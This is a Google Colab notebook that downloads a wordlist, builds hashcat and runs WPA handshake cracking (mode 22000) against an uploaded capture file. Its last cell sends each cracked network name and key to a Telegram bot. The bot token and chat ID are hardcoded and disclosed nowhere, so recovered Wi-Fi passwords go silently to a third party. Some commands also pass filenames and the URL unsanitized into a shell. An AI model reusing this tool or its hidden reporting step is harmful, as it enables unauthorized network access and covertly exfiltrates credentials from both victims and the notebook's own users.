{
  "cells": [
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {},
      "outputs": [],
      "source": [
        "# Please put the url wordlist to start cracking\n",
        "url_wordlist = \"\" # put it her"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {},
      "outputs": [],
      "source": [
        "from google.colab import files\n",
        "import os\n",
        "\n",
        "# files compresed\n",
        "!mkdir wordlists_\n",
        "# uploading cap\n",
        "uploaded = files.upload()\n",
        "for f_name in uploaded.keys():\n",
        "  print('User uploaded file \"{name}\" with length {length} bytes'.format(name=f_name, length=len(uploaded[f_name])))\n",
        "!mv {f_name} \"/content/{f_name}\""
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {},
      "outputs": [],
      "source": [
        "files_name_ = list(os.listdir('//content'))\n",
        "for i in range(len(files_name_)):\n",
        "    if \".hc22000\" in files_name_[i]:\n",
        "        cap_file_ = files_name_[i]\n",
        "        break\n",
        "    else:\n",
        "        pass\n",
        "file = open(f\"/content/cap_files/{cap_file_}\", \"r\")\n",
        "hash_ = file.readline()\n",
        "file.close()"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {},
        "colab_type": "code",
        "id": "bG3hglwpZCB_"
      },
      "outputs": [],
      "source": [
        "#Wordlists\n",
        "# delet all wordlists_txt\n",
        "files_name_ = list(os.listdir('//content'))\n",
        "for i in range(len(files_name_)):\n",
        "    if \".txt\" in files_name_[i]:\n",
        "        cmd = \"rm \"+str(files_name_[i])\n",
        "        os.system(\"bash -c '{}'\".format(cmd))\n",
        "    else:\n",
        "        pass\n",
        "# delet all wordlists_zip\n",
        "wordlists_ = list(os.listdir('//content//wordlists_'))\n",
        "for i in range(len(wordlists_)):\n",
        "    cmd = \"rm \"+str(wordlists_[i])\n",
        "    os.system(\"bash -c '{}'\".format(cmd))\n",
        "# start downloading\n",
        "!printf \"[+] Downloading wordlist...\\n\"\n",
        "cmd = \"cd wordlists_ && wget \"+str(url_wordlist)\n",
        "os.system(\"bash -c '{}'\".format(cmd))\n",
        "# get type of zip\n",
        "type_zip_ = list(os.listdir('//content//wordlists_'))\n",
        "if \".7z\" in type_zip_[0]:\n",
        "    type_zip = \"7z e\"\n",
        "elif \".gz\" in type_zip_[0]:\n",
        "    type_zip = \"gunzip\"\n",
        "else:\n",
        "    print(\"The type of zip Dosn't exists in system please change the wordlist url\")\n",
        "    quit()\n",
        "!printf \"[+] Wordlist downloaded !\\n[+] Extraction...\\n\"\n",
        "wordlist_zip = list(os.listdir('//content//wordlists_'))\n",
        "cmd = \"cd //content && \"+str(type_zip)+\" \"+wordlist_zip[0]\n",
        "os.system(\"bash -c '{}'\".format(cmd))\n",
        "!printf \"[+] Finished !\"\n",
        "files_name_ = list(os.listdir('//content'))\n",
        "for i in range(len(files_name_)):\n",
        "    if \".txt\" in files_name_[i]:\n",
        "        wordlist_ = files_name_[i]\n",
        "    else:\n",
        "        pass\n"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {},
        "colab_type": "code",
        "id": "nkcgYemCZA2n"
      },
      "outputs": [],
      "source": [
        "#Install of hashcat\n",
        "print(\"Installation of hashcat...\")\n",
        "!apt install cmake build-essential -y\n",
        "!apt install checkinstall git -y\n",
        "!git clone https://github.com/hashcat/hashcat.git && cd hashcat && make -j 8 && make install"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {},
        "colab_type": "code",
        "id": "erA610RJM1GK"
      },
      "outputs": [],
      "source": [
        "import requests as req\n",
        "import subprocess\n",
        "import os\n",
        "\n",
        "user_agent = \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 OPR/87.0.4390.45\"\n",
        "# to check if password is found\n",
        "def check_if_cracked(command): \n",
        "    try:\n",
        "        output = subprocess.check_output([command + \" --show\"], shell=True).decode()\n",
        "    except:\n",
        "        output = ''\n",
        "    if len(output) == 0:\n",
        "        return False\n",
        "    else:\n",
        "        return True\n",
        "# to send password in telegram\n",
        "def send(message_text):\n",
        "    token = \"5265256879:AAGJzC9-J0kxK94DDPxmRQdN3C_4UC0WJ1M\"\n",
        "    URL = \"https://api.telegram.org/bot\"+str(token)+\"/sendMessage?chat_id=963670337&text=\"+str(message_text)\n",
        "    headers = {'user-agent':user_agent}\n",
        "    req.post(URL, headers=headers, allow_redirects=False)\n",
        "# start the cracking \n",
        "cmd = \"cd hashcat && ./hashcat -m 22000 -a 0 \"+str(hash_)+\" /content/\"+str(wordlist_)\n",
        "os.system(\"bash -c '{}'\".format(cmd))\n",
        "subprocess.call([cmd],shell=True)\n",
        "if check_if_cracked(cmd):\n",
        "    is_cracked = True\n",
        "else:\n",
        "    is_cracked = False\n",
        "if is_cracked:\n",
        "    print(\"Password is cracked!!\")\n",
        "    cracked_password = subprocess.check_output([cmd + \" --show\"], shell=True).decode()\n",
        "    key = cracked_password.split(':')[-1]\n",
        "    ssid = cracked_password.split(':')[-2]\n",
        "    print(f\"\\n+ NAME : {ssid}\")\n",
        "    print(f\"\\n+ KEY  :    {key}\")\n",
        "    print(f\"wordlist used : {wordlist_}\")\n",
        "    send(f\"NAME : {ssid}\\nKEY  : {key}\")\n",
        "else:\n",
        "    print(\"Password was not found in wordlist ===>> {wordlist_}\")\n"
      ]
    }
  ],
  "metadata": {
    "accelerator": "GPU",
    "colab": {
      "collapsed_sections": [],
      "name": "Penglab.ipynb",
      "provenance": []
    },
    "kernelspec": {
      "display_name": "Python 3",
      "name": "python3"
    },
    "language_info": {
      "codemirror_mode": {
        "name": "ipython",
        "version": 3
      },
      "file_extension": ".py",
      "mimetype": "text/x-python",
      "name": "python",
      "nbconvert_exporter": "python",
      "pygments_lexer": "ipython3",
      "version": "3.10.4"
    }
  },
  "nbformat": 4,
  "nbformat_minor": 0
}
